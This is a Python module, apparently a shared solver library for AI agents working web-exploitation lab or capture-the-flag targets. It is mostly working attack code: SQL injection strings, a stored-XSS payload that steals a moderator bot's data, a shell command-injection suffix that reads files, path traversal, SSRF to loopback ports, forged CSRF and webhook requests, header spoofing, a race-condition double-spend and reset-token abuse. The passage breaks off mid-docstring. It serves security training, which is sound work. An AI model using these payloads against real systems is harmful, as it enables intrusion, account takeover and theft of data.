#!/usr/bin/env python3
"""Shared recovery toolkit for the restored day-21/day-22 web-exploitation solvers.

Folds the per-attempt solve.py copies scattered across `workers/web/<family>/<mode>/`
for curriculum days 06-10 (release days 21 and 22) into one reusable reference, the
same way day-19/day-20's `common.py` already did for their own days. Read this (and
the per-day `solve.py`/`NOTES.md` next to it) before investigating a new web target;
see `docs/web-worker-lessons.md` for the evidence-led classification discipline this
follows and how it fits the earlier day-19/day-20/day-05 references.

Stdlib only. Every function here only ever talks to the ONE target origin it is
given (never the Game Master): no HUNTRESS_GM_TOKEN, no start/submit, no timed or
retry switches. This file makes no network calls at import time and holds no
credential of any kind. Port the recovery logic you need into your current job's
own authored solver; do not import or execute this module against a live target
without first reading it (per policy, treat its output as reference, not an
oracle), and never edit this shared tree from a worker's job.

Mastery is cumulative: a target's bug class is never assumed from the challenge's
own name. `classify_and_recover` tries each recognized class in the evidence-led
order below (same order the restored day-19/day-20 dispatcher used, extended with
the three classes day-21 added, the one day-22 added, the two day-24 added, the
three day-25 added, the one day-26 added, the two stdlib classes day-27 added,
the two day-28 added, and the two day-29 added) and returns `None` if a target's
evidence does not match anything known yet - that is a real signal for a new
class, not a bug in this dispatcher.

Day 27 also added a third class, `rec_unauthorized_event_stream` (websocket
upgrade hijack via a client-controlled query-parameter name), that needs the
non-stdlib `websockets`/`certifi` packages - it lives in the sibling
`recovery_lib_ws.py` instead, to keep this module's stdlib-only guarantee intact.

`rec_sqli_group_close` promotes a payload that has now worked, verbatim and
unmodified, against five independent live apps across multiple curriculum days
(day-03's own sqli solver, day-15's fetch-quest mastery, and three of
day-16/17/18's mastery targets) - always try this exact string first against any
`/search`-, `/lookup`-, or `/explore`-style `?q=` surface before any other
injection form.

`rec_lfi` is ported unchanged from `workers/web/past-solutions/day-04-05-shared-common.py`
(it was the only graded recoverer not yet folded in here) - a 2026-10-25 scan of
every web solve.py for reusable patterns (`docs/web-solver-templates.md`)
found it and promoted it; that same scan produced the drop-in worker starter
and template modules under `solver_py_scripts/web_templates/`.
"""
import base64
import copy
import json
import re
import time
import urllib.error
import urllib.parse
import urllib.request
import http.cookiejar
from concurrent.futures import ThreadPoolExecutor
from html.parser import HTMLParser

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")  # some lanes 1010-block urllib's default UA
TIMEOUT = 30
DELAY = 0.8  # polite pacing between requests to the same target, matching the restored notes
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")
# Common Kestrel / container-internal ports for rec_ssrf, tried in this order. 8080 is the
# only one observed to succeed so far (three live day-24 variants); the rest are generic
# fallbacks rather than a re-derived wordlist per attempt.
SSRF_CANDIDATE_PORTS = (8080, 80, 5000, 5001, 8081, 3000, 8000, 4000, 8888, 443)


class Links(HTMLParser):
    """Collects <a href> targets from a page, for directory-index and dashboard parsing."""

    def __init__(self):
        super().__init__()
        self.hrefs = []

    def handle_starttag(self, tag, attrs):
        if tag == "a":
            for key, value in attrs:
                if key == "href" and value:
                    self.hrefs.append(value)


class Target:
    """Paced, cookie-jarred HTTP client scoped to exactly one assigned target origin.

    Refuses any URL outside its own origin (artifact/evidence links must never be
    followed off-target), and can optionally save every response for an evidence
    trail the way the restored notes record one."""

    def __init__(self, base_url, evidence_dir=None):
        self.base = base_url.rstrip("/")
        self.evidence_dir = evidence_dir
        self._requests = 0
        self.cookiejar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookiejar))
        if evidence_dir:
            evidence_dir.mkdir(parents=True, exist_ok=True)

    def _save(self, name, status, body):
        if not self.evidence_dir or not name:
            return
        (self.evidence_dir / f"{name}.meta.json").write_text(json.dumps({"status": status}, indent=2))
        (self.evidence_dir / f"{name}.body").write_text(body)

    def request(self, path_or_url, method="GET", data=None, headers=None, save=None):
        if self._requests:
            time.sleep(DELAY)
        self._requests += 1
        url = path_or_url if path_or_url.startswith("http") else self.base + path_or_url
        if not url.startswith(self.base):
            raise ValueError(f"refusing out-of-scope URL: {url}")
        body = json.dumps(data).encode() if data is not None else None
        hdrs = {"User-Agent": UA}
        if data is not None:
            hdrs["Content-Type"] = "application/json"
        hdrs.update(headers or {})
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        try:
            with self.opener.open(req, timeout=TIMEOUT) as resp:
                status, text = resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as err:  # 4xx/5xx bodies are still evidence
            status, text = err.code, err.read().decode("utf-8", "replace")
        self._save(save, status, text)
        return status, text

    def get(self, path, headers=None, save=None):
        return self.request(path, "GET", headers=headers, save=save)

    def get_json(self, path, headers=None, save=None):
        status, body = self.get(path, headers=headers, save=save)
        return status, (json.loads(body) if status == 200 else None)

    def post_json(self, path, payload, headers=None, save=None):
        status, body = self.request(path, "POST", data=payload, headers=headers, save=save)
        return status, (json.loads(body) if body else None)


# --------------------------------------------------------------------------- recoverers
# Each takes a Target (and whatever evidence the dispatcher already gathered) and
# returns the proof_<hex> string, or None if its class's evidence does not pan out.

def rec_backup(t):
    """Root crawler-policy hint -> robots.txt Disallow -> open directory index -> named
    backup file -> proof. No wordlists: every path comes from the previous response.
    Source: day-19 backup-exposure; restored again (independently) in day-20's common.py,
    day-21 and day-22's mastery targets."""
    status, robots = t.get("/robots.txt", save="robots")
    if status != 200:
        return None
    for d in re.findall(r"(?mi)^\s*Disallow:\s*(\S+)", robots):
        d = "/" + d.strip("/") + "/"
        status, index = t.get(d, save="index" + d.replace("/", "_"))
        if status != 200:
            continue
        parser = Links()
        parser.feed(index)
        members = [h for h in parser.hrefs if h.rstrip("/").split("/")[-1]]
        # backup-looking names first, but try every listed member - the dispatcher does
        # not assume which one carries the proof.
        members.sort(key=lambda h: 0 if re.search(
            r"\.(bak|old|orig|save|swp|zip|tar|gz|sql|json|txt|env)(\.|$)", h, re.I) else 1)
        for href in members:
            path = href if href.startswith("/") else d + href
            status, body = t.get(path, save="file_" + path.strip("/").replace("/", "_"))
            if status != 200:
                continue
            match = PROOF_RE.search(body)
            if match:
                return match.group(0)
    return None


def rec_idor(t, html):
    """Dashboard sets a session cookie and links an activity feed plus per-object pages.
    An object page's inline fetch() discloses the object-API URL template; the feed
    discloses a foreign object id (owner != current_user, or visibility reference_only);
    request that id with the same session - no ownership check stops it.
    Source: day-19 idor; restored again in day-21/day-22 mastery (Incident Picnic app)."""
    feed = next(iter(re.findall(r'href="(/api/[^"]+)"', html)), None)
    case_links = re.findall(r'href="(/[a-z]+/\d+)"', html)
    if not feed or not case_links:
        return None
    my_ids = {int(link.rsplit("/", 1)[1]) for link in case_links}
    status, case_page = t.get(case_links[0], save="mycase")
    api_template = None
    inline = re.search(r'fetch\(["\'](/api/[^"\']*?)(\d+)([^"\']*)["\']', case_page)
    if inline:
        api_template = (inline.group(1), inline.group(3))
    status, feed_body = t.get(feed, save="feed")
    try:
        feed_json = json.loads(feed_body)
    except ValueError:
        return None
    me = feed_json.get("current_user")
    foreign_ids = []
    for event in feed_json.get("events", []):
        case_id = event.get("case_id") or event.get("id")
        if case_id is None:
            continue
        if (event.get("owner") and event.get("owner") != me) or \
                event.get("visibility") == "reference_only" or case_id not in my_ids:
            foreign_ids.append(case_id)

    def object_urls(case_id):
        if api_template:
            yield f"{api_template[0]}{case_id}{api_template[1]}"
        kind = case_links[0].rsplit("/", 2)[-2]
        yield f"/api/{kind}/{case_id}"

    for case_id in dict.fromkeys(foreign_ids):
        for url in dict.fromkeys(object_urls(case_id)):
            status, body = t.get(url, save=f"obj_{case_id}")
            if status == 200:
                match = PROOF_RE.search(body)
                if match:
                    return match.group(0)
                break
    return None


def rec_lfi(t, html, prompt=""):
    """A PHP (or similar) viewer links an endpoint that `include`s a file named by a
    query parameter (e.g. `?doc=about.php`), with no path-traversal sanitization.
    The endpoint/parameter names are derived from that link; the objective file's
    path is derived from the challenge prompt text ("mounted at <path>") when given,
    else a documented default. A bounded `../`-depth sweep (1-8) finds the right
    traversal depth without guessing the directory layout; one absolute-path
    fallback covers includes that also accept a leading slash.
    Source: workers/web/past-solutions/day-04-05-shared-common.py's `rec_lfi`
    (curriculum day 4, release day 20) - promoted here unchanged after a
    2026-10-25 template scan found it was the only graded recoverer not yet
    folded into this module."""
    link = re.search(r'href="([^"]*\.php)\?(\w+)=', html)
    endpoint, param = (link.group(1), link.group(2)) if link else ("/reader.php", "doc")
    objective = re.search(r"mounted at (/\S+)", prompt)
    target_path = objective.group(1).rstrip(".") if objective else "/run/huntress/objective.txt"
    rel = target_path.lstrip("/")
    for depth in range(1, 9):
        payload = "../" * depth + rel
        status, body = t.get(f"{endpoint}?{urllib.parse.urlencode({param: payload})}", save=f"lfi_d{depth}")
        match = PROOF_RE.search(body)
        if match:
            return match.group(0)
    status, body = t.get(f"{endpoint}?{urllib.parse.urlencode({param: target_path})}", save="lfi_abs")
    match = PROOF_RE.search(body)
    return match.group(0) if match else None


def rec_session_fixation(t, clues):
    """`/api/clues` -> feature_route/secondary_route/session_hint. "Plant" the client-
    chosen session id on feature_route (the app adopts it as its session cookie), then
    "stroll" the secondary_route with that same planted id to collect the proof.
    Source: day-08-session-impression (curriculum day 8, release day 21) - this
    family's own bug, also seen mixed into day-21/day-22 mastery targets."""
    sid, feature, secondary = clues["session_hint"], clues["feature_route"], clues["secondary_route"]
    status, plant = t.get_json(feature + "?" + urllib.parse.urlencode({"sid": sid}), save="plant")
    if not plant or not plant.get("session_established"):
        return None
    status, stroll = t.get_json(secondary + "?" + urllib.parse.urlencode({"sid": sid}), save="stroll")
    proof = (stroll or {}).get("evidence", "").strip()
    return proof if PROOF_RE.fullmatch(proof) else None


def rec_reflect_callback(t, clues):
    """`/api/clues` -> feature_route/secondary_route/callback_nonce (Fastify Search
    Mirror). feature_route reflects a query param verbatim (reflected XSS sink); an
    isolated browser visiting `<img src=x onerror=fetch(secondary_route?nonce=...)>`
    would load secondary_route with browser trust signals, which releases the proof.
    Source: day-06-reflect-upon-this (curriculum day 6, release day 21) - this
    family's own bug."""
    feature, secondary, nonce = clues["feature_route"], clues["secondary_route"], clues["callback_nonce"]
    probe = "reflectprobeZZ9"
    status, page = t.get(f"{feature}?q={urllib.parse.quote(probe)}", save="reflect_probe")
    if probe not in page:
        return None
    status, callback_body = t.get(
        f"{secondary}?nonce={urllib.parse.quote(nonce)}",
        headers={"Referer": f"{t.base}{feature}?q=test"}, save="callback")
    match = re.search(r'"evidence"\s*:\s*"(proof_[0-9a-fA-F]+)"', callback_body)
    return match.group(1) if match else None


def rec_stored_xss_bot(t, clues):
    """`/api/clues` -> feature_route (a /<collection> submission form) plus
    moderator_data_route and receipt_route_template. A posted message's content is
    stored and rendered unescaped; a moderator bot opens it in an authenticated
    browser. The stored payload fetches moderator_data_route same-origin (riding the
    bot's session) and POSTs the result back to this message's own receipt route;
    poll the message page for the moderator-receipt block.
    Source: day-07-stored-xss (curriculum day 7, release day 21) - this family's
    own bug ("Kind Regards" / "Feedback Loop" apps)."""
    data_route = clues["moderator_data_route"]
    receipt_template = clues["receipt_route_template"]
    collection_match = re.search(r"/api/([a-z0-9_-]+)/\{id\}", receipt_template)
    if not collection_match:
        return None
    collection = collection_match.group(1)
    submit_route, view_route = f"/api/{collection}", f"/{collection}"

    status, placeholder = t.post_json(submit_route, {"message": "placeholder"}, save="submit_placeholder")
    if not placeholder or "id" not in placeholder:
        return None
    payload_id = placeholder["id"] + 1
    receipt_route = receipt_template.replace("{id}", str(payload_id))
    payload = ("<script>fetch(%r,{credentials:'include'})"
               ".then(function(r){return r.text()})"
               ".then(function(t){return fetch(%r,{method:'POST',"
               "headers:{'Content-Type':'application/json'},body:JSON.stringify({evidence:t})})});"
               "</script>" % (data_route, receipt_route))
    status, posted = t.post_json(submit_route, {"message": payload}, save="submit_payload")
    if not posted or posted.get("id") != payload_id:
        return None  # id skew: a fresh attempt must recompute receipt_route for the real id

    receipt_re = re.compile(r"Moderator receipt</strong><pre>(.*?)</pre>", re.S)
    for attempt in range(12):  # bounded polling for the moderator bot to visit; ~6s apart
        time.sleep(6.0)
        status, page = t.get(f"{view_route}/{payload_id}", save=f"poll_{attempt}")
        if status != 200:
            continue
        match = receipt_re.search(page)
        if match:
            proof = PROOF_RE.search(match.group(1))
            return proof.group(0) if proof else match.group(1).strip()
    return None


def rec_csrf(t, clues):
    """`/api/clues` -> feature_route (a state-changing endpoint reachable by plain GET,
    with a cosmetic csrf_token that is never actually checked). Forge that GET with
    cross-site Origin/Referer/Sec-Fetch-Site headers while riding the session already
    established on this client - exactly what a real cross-site <img>/<form> GET CSRF
    would do - then read the preferences-route "changed_across_sites"/"evidence".
    Source: day-09-forged-with-care (curriculum day 9, release day 22) - this
    family's own bug ("Notification Nook" app)."""
    feature_route = clues["feature_route"]
    status, prefs_html = t.get("/preferences", save="preferences")
    token_match = re.search(r"name=['\"]csrf_token['\"] value=['\"]([^'\"]+)['\"]", prefs_html)
    csrf_token = token_match.group(1) if token_match else ""
    dest_match = re.search(r"<option value=['\"]([^'\"]+)['\"]>External review mailbox</option>", prefs_html)
    destination = dest_match.group(1) if dest_match else "review@outside.example.invalid"
    forge_url = f"{feature_route}?destination={destination}&csrf_token={csrf_token}"
    t.get(forge_url, headers={
        "Origin": "https://attacker.example.invalid", "Referer": "https://attacker.example.invalid/csrf.html",
        "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Dest": "document"}, save="forge")
    status, final = t.get_json("/api/preferences", save="final_preferences")
    return (final or {}).get("evidence")


def rec_upload_bypass(t, clues):
    """`/api/clues` -> feature_route (upload) and render_route (preview). The stated
    policy (".txt only") is never actually enforced on filename extension or
    content_type: uploading a `.html` filename routes to the staff HTML-preview path
    instead of the plain-text path, and that preview evaluates a `{{objective}}`
    placeholder the server fills in with the proof.
    Source: day-10-uploading-expectations (curriculum day 10, release day 22) -
    this family's own bug."""
    upload_route, render_route = clues["feature_route"], clues["render_route"]
    status, upload = t.post_json(upload_route, {
        "filename": "proof-recovery.html", "content": "{{objective}}", "content_type": "text/html"
    }, save="upload")
    if not upload or "path" not in upload or not upload["path"].startswith(render_route):
        return None
    status, rendered = t.get(upload["path"], save="rendered")
    return rendered.strip() if status == 200 else None


def rec_ssrf(t, clues):
    """`/api/clues` -> feature_route (a fetch proxy; takes an absolute `url` query
    param and fetches it server-side) and secondary_route (an "internal_only"
    endpoint on the SAME origin that refuses direct requests from outside the
    host, checked by source IP, not by any header/cookie/token). Point
    feature_route at `http://127.0.0.1:<port><secondary_route>` so the fetch
    happens from the server's own loopback interface, which satisfies the
    internal-only check; the response carries the proof. Only the internal TCP
    port is unknown (8080 confirmed on every live variant seen so far); this
    tries a short documented port list and stops at the first JSON response
    carrying a `proof_<hex>`.
    Source: day-15-fetch-quest (curriculum day 15, release day 24) - this
    family's own bug (ASP.NET Core Minimal API)."""
    feature, secondary = clues.get("feature_route"), clues.get("secondary_route")
    if not feature or not secondary:
        return None
    for port in SSRF_CANDIDATE_PORTS:
        internal_url = f"http://127.0.0.1:{port}{secondary}"
        status, body = t.get_json(
            feature + "?" + urllib.parse.urlencode({"url": internal_url}), save=f"ssrf_port_{port}")
        if status == 200 and isinstance(body, dict):
            match = PROOF_RE.search(json.dumps(body))
            if match:
                return match.group(0)
    return None


def rec_field_action_bypass(t, clues):
    """`/api/clues` -> feature_route + inventory_route + protected_reference (a
    generic "execute"-style endpoint whose authorization check is keyed to a
    (field, action) pair inconsistently - e.g. `action=view` on the restricted
    field is gated but `action=export` on the same field is not).
    `inventory_route` discloses the exact fields/actions/query-parameter-name
    grid to try, so this is brute-forceable without guessing: cross every field
    with every action against the protected reference id and stop at the first
    response that carries `evidence`.
    Source: day-14-the-api-has-opinions (curriculum day 14, release day 24) -
    this family's own bug ("WAR Room" / Jakarta Servlet app)."""
    feature = clues.get("feature_route")
    protected_id = clues.get("protected_reference")
    if not feature or protected_id is None:
        return None
    inventory_route = clues.get("inventory_route", "/api/inventory")
    status, inv = t.get_json(inventory_route, save="inventory")
    if status != 200 or not inv:
        return None
    fields = inv.get("fields", ["title", "note"])
    actions = inv.get("actions", ["view", "export"])
    qp = inv.get("query_parameters", ["id", "fields", "action"])
    id_param, fields_param, action_param = (qp + ["id", "fields", "action"])[:3]
    for field in fields:
        for action in actions:
            query = urllib.parse.urlencode(
                {id_param: protected_id, fields_param: field, action_param: action})
            status, body = t.get_json(f"{feature}?{query}", save=f"grid_{field}_{action}")
            if status == 200 and isinstance(body, dict) and "evidence" in body:
                return body["evidence"]
    return None


def rec_command_injection(t, clues):
    """`/api/clues` -> feature_route + input_parameter + example_path (a Gin app
    that shells out, unescaped, to build a directory listing from the raw
    parameter value - the normal response is an `ls -l`-shaped stdout). Appending
    `; <cmd>` to the parameter value runs `<cmd>` as a second shell statement and
    concatenates its stdout into the response. `$(...)` command substitution is
    rejected server-side with `{"error":"diagnostic_failed"}` on every target seen
    - only plain `;`-chaining works. The proof is never reflected by the base
    command; the container's own `OBJECTIVE_PATH` env var (itself only visible via
    an `env` injection) names the file that holds it.
    Source: day-16-shell-company (curriculum day 16, release day 25) - this
    family's own bug ('Shell Company' Gin app)."""
    feature = clues.get("feature_route")
    param = clues.get("input_parameter", "path")
    example = clues.get("example_path", "/app/static")
    if not feature:
        return None
    suffix = "; cat $OBJECTIVE_PATH 2>/dev/null || cat /run/huntress/objective.txt"
    status, body = t.get(feature + "?" + urllib.parse.urlencode({param: example + suffix}), save="cmdi")
    match = PROOF_RE.search(body)
    return match.group(0) if match else None


def rec_reset_account_confusion(t, clues):
    """`/api/clues` -> feature_route (request a password-reset token) + secondary_route
    (redeem a token to complete recovery) + recovery_guide_route (discloses the exact
    account_parameter/token_parameter names and the account ids in play, each flagged
    self_service true/false - no guessing needed). feature_route correctly refuses to
    issue a token for a non-self-service account, but secondary_route never binds the
    redeemed token to the account_id it is redeemed against: request a token for a
    self-service account, then redeem that same token while claiming a different
    (non-self-service) account id.
    Source: day-17-reset-expectations (curriculum day 17, release day 25) - this
    family's own bug (Symfony app)."""
    feature, secondary = clues.get("feature_route"), clues.get("secondary_route")
    guide_route = clues.get("recovery_guide_route")
    if not feature or not secondary or not guide_route:
        return None
    status, guide = t.get_json(guide_route, save="recovery_guide")
    if status != 200 or not guide:
        return None
    account_param = guide.get("account_parameter", "account_id")
    token_param = guide.get("token_parameter", "token")
    accounts = guide.get("accounts", [])
    self_ids = [a["id"] for a in accounts if a.get("self_service")]
    other_ids = [a["id"] for a in accounts if not a.get("self_service")]
    for self_id in self_ids:
        status, issued = t.get_json(f"{feature}?{urllib.parse.urlencode({account_param: self_id})}",
                                     save=f"request_{self_id}")
        token = (issued or {}).get("token")
        if status != 200 or not token:
            continue
        for other_id in other_ids:
            query = urllib.parse.urlencode({token_param: token, account_param: other_id})
            status, redeemed = t.get_json(f"{secondary}?{query}", save=f"redeem_{self_id}_as_{other_id}")
            if status == 200 and isinstance(redeemed, dict):
                match = PROOF_RE.search(json.dumps(redeemed))
                if match:
                    return match.group(0)
    return None


def rec_graphql_field_bypass(t, clues):
    """`/api/clues` -> feature_route (a live GraphQL endpoint: POST, JSON body
    {"query": ...}) + protected_reference (an id hidden from the list query's
    sensitive field). Authorization is enforced by omission on the list surface
    (e.g. `caseIndex`, which never returns the sensitive field at all) but the
    matching single-object surface (e.g. `case(id)`) has no field-level check
    whatsoever - query it directly for protected_reference. Needs a browser-like
    User-Agent (Target's default UA) - a bare urllib UA gets 403'd by the edge WAF
    on this app.
    Source: day-18-resolver-revolt (curriculum day 18, release day 25) - this
    family's own bug (GraphQL.js 'Graph Garden')."""
    feature = clues.get("feature_route")
    protected_id = clues.get("protected_reference")
    if not feature or protected_id is None:
        return None
    status, obj = t.post_json(
        feature, {"query": 'query { case(id: "%s") { id title note } }' % protected_id}, save="graphql_case")
    note = ((obj or {}).get("data") or {}).get("case", {}).get("note", "")
    match = PROOF_RE.search(note)
    return match.group(0) if match else None


def rec_forged_webhook_event(t, clues):
    """`/api/clues` -> feature_route + event_type + owner_scope (+ current_role),
    with no secondary_route/inventory_route/protected_reference/state_format_route
    (distinguishing it from every other feature_route-driven class above). The
    webhook receiver at feature_route has no signature/HMAC/auth check at all: a
    GET returns `post_required`, an empty POST returns `webhook_rejected`, but it
    blindly trusts a POST body that claims the disclosed event_type/owner_scope.
    The exact field names are not disclosed and do not match the clue's own key
    names - binary-searching the field space against a live target found the
    receiver wants exactly two bare keys, `event` and `owner` (NOT
    `event_type`/`owner_scope`, NOT `type`/`scope`), both required, both values
    matched exactly, no nesting under `data`/`payload` needed. The check is
    stateless - the same proof_<hex> comes back on every correct repeat - so a
    maximal alias superset is kept as a fallback in case a future variant uses
    different bare key names.
    Source: day-19-trust-the-webhook (curriculum day 19, release day 26) - this
    family's own bug (Starlette app)."""
    feature = clues.get("feature_route")
    event_type = clues.get("event_type")
    owner_scope = clues.get("owner_scope")
    if not feature or not event_type or not owner_scope:
        return None
    bodies = (
        {"event": event_type, "owner": owner_scope},
        {"event": event_type, "type": event_type, "event_type": event_type,
         "owner_scope": owner_scope, "scope": owner_scope, "owner": owner_scope},
    )
    for i, body in enumerate(bodies):
        status, resp = t.post_json(feature, body, save=f"forge_{i}")
        text = resp if isinstance(resp, str) else json.dumps(resp)
        match = PROOF_RE.search(text)
        if match:
            return match.group(0)
    return None


def rec_fail_open_policy(t, clues):
    """Malformed remote-policy payload reaches a fail-open decoder exception path.

    Source: day-24-fail-open-friday (release day 28), graded in all three modes.
    The format route discloses the parameter and per-attempt prefix; no valid-decision
    baseline is needed for this stateless recovery."""
    feature, format_route = clues.get("feature_route"), clues.get("policy_format_route")
    if not feature or not format_route:
        return None
    status, fmt = t.get_json(format_route, save="policy_format")
    if status != 200 or not isinstance(fmt, dict):
        return None
    param, prefix = fmt.get("query_parameter"), fmt.get("prefix")
    if not param or prefix is None:
        return None
    payloads = (
        "not-valid-base64!!!",
        base64.urlsafe_b64encode(b"\x00\x01\x02not json").decode().rstrip("="),
    )
    for i, payload in enumerate(payloads):
        query = urllib.parse.urlencode({param: str(prefix) + payload})
        status, body = t.get(f"{feature}?{query}", save=f"fail_open_{i}")
        match = PROOF_RE.search(body)
        if match:
            return match.group(0)
    return None


def rec_missing_log_event(t, clues, before=None):
    """Report a privileged export whose decisive audit event is missing.

    Source: day-25-if-a-breach-falls-in-a-log (release day 28). `before` is the
    read-only secondary-route response used by the dispatcher to identify this
    class, avoiding a duplicate request and any speculative feature-route probe."""
    feature, secondary = clues.get("feature_route"), clues.get("secondary_route")
    if not feature or not secondary:
        return None
    if before is None:
        status, before = t.get_json(secondary, save="status_before")
        if status != 200:
            return None
    fields = (before or {}).get("report", {}).get("fields", [])
    if len(fields) < 3:
        return None
    id_field, missing_field, observed_field = fields[:3]
    status, export = t.post_json(feature, {}, save="export")
    if status != 200 or not isinstance(export, dict):
        return None
    export_id = export.get(id_field) or export.get("export_id")
    operation = export.get("operation")
    if not export_id or not operation:
        return None
    status, after = t.get_json(secondary, save="status_after")
    if status != 200 or not isinstance(after, dict):
        return None
    observed = None
    for event in after.get("events", []):
        if event.get(id_field) == export_id or event.get("export_id") == export_id:
            observed = event.get("event")
            break
    if not observed:
        return None
    report = {id_field: export_id, missing_field: operation, observed_field: observed}
    status, result = t.post_json(secondary, report, save="report")
    text = json.dumps(result) if isinstance(result, (dict, list)) else str(result or "")
    match = PROOF_RE.search(text)
    return match.group(0) if match else None


def rec_unverified_update(t, clues):
    """Activate an update with a restricted hook but its original signed metadata.

    Source: day-26-trust-the-build (release day 29), graded across all modes. The
    feed, policy, package object and restricted hook are all derived live."""
    feature = clues.get("feature_route")
    feed_route, policy_route = clues.get("update_feed"), clues.get("update_policy")
    if not feature or not feed_route or not policy_route:
        return None
    status, feed = t.get_json(feed_route, save="update_feed")
    if status != 200 or not isinstance(feed, dict):
        return None
    status, policy = t.get_json(policy_route, save="update_policy")
    if status != 200 or not isinstance(policy, dict):
        return None
    restricted = [hook.get("name") for hook in policy.get("hooks", [])
                  if hook.get("access") == "restricted" and hook.get("name")]
    for number, original in enumerate(feed.get("updates", [])):
        if not isinstance(original, dict) or not isinstance(original.get("artifact"), dict):
            continue
        for hook in restricted:
            update = copy.deepcopy(original)
            update["artifact"]["hook"] = hook
            status, response = t.post_json(
                feature, update, save=f"tampered_update_{number}_{hook}")
            match = PROOF_RE.search(json.dumps(response))
            if match:
                return match.group(0)
    return None


def rec_internal_affairs(t, clues):
    """Public server-side fetch -> disclosed loopback case service -> foreign IDOR.

    Source: day-27-internal-affairs (release day 29). The internal URL is data in
    the outer request, not a new target origin contacted by this client."""
    feature = clues.get("feature_route")
    topology_route = clues.get("topology_route")
    directory_route = clues.get("case_directory_route")
    role = clues.get("current_role")
    if not all((feature, topology_route, directory_route, role)):
        return None
    status, topology = t.get_json(topology_route, save="topology")
    if status != 200 or not isinstance(topology, dict):
        return None
    status, directory = t.get_json(directory_route, save="case_directory")
    if status != 200 or not isinstance(directory, dict):
        return None
    status, hint_body = t.get(feature, save="feature_schema")
    try:
        hint = json.loads(hint_body)
    except (TypeError, ValueError):
        hint = None
    fetch_param = ((hint or {}).get("query_parameter") if status == 400 else None) or "target"
    service = topology.get("case_service")
    if not service:
        return None
    for case in directory.get("cases", []):
        if case.get("owner") == role or "id" not in case:
            continue
        parts = urllib.parse.urlsplit(service)
        query = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
        query.append(("id", str(case["id"])))
        internal = urllib.parse.urlunsplit(
            parts._replace(query=urllib.parse.urlencode(query)))
        outer = urllib.parse.urlencode({fetch_param: internal})
        status, body = t.get(f"{feature}?{outer}", save=f"foreign_case_{case['id']}")
        match = PROOF_RE.search(body)
        if match:
            return match.group(0)
    return None


def rec_double_spend(t, clues, racers=12):
    """`/api/clues` -> feature_route (POST; redeems one credit via a non-atomic
    check-then-decrement - reads the stored count, checks it is > 0, then writes
    count-1 back as two separate steps with no row lock/atomic UPDATE) +
    secondary_route (GET; reports the proof once the stored balance has gone
    negative). Shares its bare two-key clue shape with `rec_ssrf` and the missing-log
    class, so `classify_and_recover` first checks secondary_route read-only and selects
    this recoverer only when that response discloses a `credits` balance.
    A single serial POST to feature_route behaves "correctly" (does not exhibit
    the bug) and permanently burns the target's one and only credit - there is no
    in-app reset/topup/refund route, so the race MUST be the very first touch of
    feature_route, never a solo probe. Fires `racers` concurrent POSTs via a bare
    thread pool talking directly through `t`'s opener (bypassing `Target.request`'s
    inter-request `DELAY`, which would stagger the requests enough to lose the
    race), then GETs secondary_route once. 12-16 racers was consistently enough on
    every confirmed target (~5/16 landed `ok:true`).
    Source: day-21-double-spent (curriculum day 21, release day 27) - this
    family's own bug ('Receipt...' Rails app)."""
    feature, secondary = clues.get("feature_route"), clues.get("secondary_route")
    if not feature or not secondary:
        return None

    def fire(_i):
        req = urllib.request.Request(
            t.base + feature, data=b"{}",
            headers={"User-Agent": UA, "Content-Type": "application/json"}, method="POST")
        try:
            with t.opener.open(req, timeout=TIMEOUT) as resp:
                return resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as err:
            return err.read().decode("utf-8", "replace")

    with ThreadPoolExecutor(max_workers=racers) as ex:
        list(ex.map(fire, range(racers)))
    status, body = t.get(secondary, save="audit")
    match = PROOF_RE.search(body)
    return match.group(0) if match else None


def rec_proxy_trust_bypass(t, clues):
    """`/api/clues` -> feature_route + current_role + deployment ==
    "trusted_reverse_proxy" (no secondary_route/inventory_route/protected_reference
    alongside it - distinguishable from every other feature_route-driven class by
    this key shape alone). feature_route decides "am I being called from loopback"
    from a client-supplied X-Forwarded-For header with no actual upstream-proxy
    allowlist: sending `X-Forwarded-For: 127.0.0.1` flips `evaluated_client` and
    returns the proof. X-Real-IP/X-Forwarded-Host/X-Forwarded-Proto do not affect
    the decision (tried and ruled out); XFF alone is both necessary and sufficient.
    Stateless check - safe to re-probe freely.
    Source: day-23-forwarded-misgivings (curriculum day 23, release day 27) - this
    family's own bug (Micronaut 'Forward Desk')."""
    feature = clues.get("feature_route")
    if not feature or clues.get("deployment") != "trusted_reverse_proxy":
        return None
    status, body = t.get_json(feature, headers={"X-Forwarded-For": "127.0.0.1"}, save="proxy_trust")
    if status == 200 and isinstance(body, dict):
        match = PROOF_RE.search(json.dumps(body))
        if match:
            return match.group(0)
    return None


def rec_sqli_group_close(t, html):
    """A `/search`-, `/lookup`-, or `/explore`-style `?q=` form backed by an
    already-quoted LIKE clause (`WHERE (visible = 1 AND note LIKE '%<q>%')` shape).
    The group-closing boolean payload `') OR ('1'='1` turns the WHERE true for
    every row and surfaces the hidden/restricted record. Comment-based (`--`, `#`)
    and plain `' OR '1'='1` payloads do NOT work against this app shape - the
    group-closing form is tried first and has been sufficient on every confirmed
    target so far; the others are kept only as a fallback.
    Source: workers/web/past-solutions/day-03-sqli-solve.py (curriculum day 3);
    reconfirmed verbatim, unmodified, against five independent live apps across
    day-15's fetch-quest mastery and three of day-16/17/18's mastery targets
    (Archive Atlas, Search Party x2)."""
    action_match = re.search(r"<form[^>]*action=['\"]([^'\"]+)['\"]", html)
    name_match = re.search(r"<input[^>]*name=['\"]([^'\"]+)['\"]", html)
    action = action_match.group(1) if action_match else "/search"
    name = name_match.group(1) if name_match else "q"
    for i, payload in enumerate(("') OR ('1'='1", "%' OR '1'='1", "') OR ('1'='1'-- -", "' OR '1'='1")):
        status, body = t.get(f"{action}?{urllib.parse.urlencode({name: payload})}", save=f"sqli_{i}")
        match = PROOF_RE.search(body)
        if match:
            return match.group(0)
    return None


def classify_and_recover(t, evidence=None, prompt="", initial=None):
    """Evidence-led dispatcher: GET / once, then try each recognized class in order.

